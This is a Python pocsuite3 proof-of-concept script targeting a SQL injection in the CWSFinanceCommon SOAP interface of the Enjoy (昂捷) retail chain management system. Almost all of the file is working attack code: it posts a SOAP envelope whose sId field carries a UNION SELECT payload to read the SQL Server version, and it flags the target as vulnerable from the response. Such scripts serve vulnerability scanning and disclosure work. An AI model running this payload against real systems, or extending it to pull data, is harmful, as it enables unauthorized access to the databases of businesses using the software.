# _*_ coding:utf-8 _*_
# @Time : 2023/11/27 13:02
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class enjoyIT1(POCBase):
    pocDesc = ''' 昂捷商业连锁管理信息系统CWSFinanceCommon接口SQL注入漏洞 '''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-27'
    createDate = '2023-11-27'
    updateDate = '2023-11-27'
    name = '昂捷商业连锁管理信息系统CWSFinanceCommon接口SQL注入漏洞'
    appName = '昂捷商业连锁管理信息系统'



    def _verify(self):

        result = {}
        path = "/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": "http://tempuri.org/GetOSpById"
        }

        url = self.url + path
        payload = 'UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- YQmj'
        xml_data = '''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetOSpById xmlns="http://tempuri.org/">
              <sId>1' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- YQmj</sId>
            </GetOSpById>
          </soap:Body>
        </soap:Envelope>'''

        try:
            response = requests.post(url, headers=headers,data=xml_data,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'Microsoft SQL Server' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(enjoyIT1)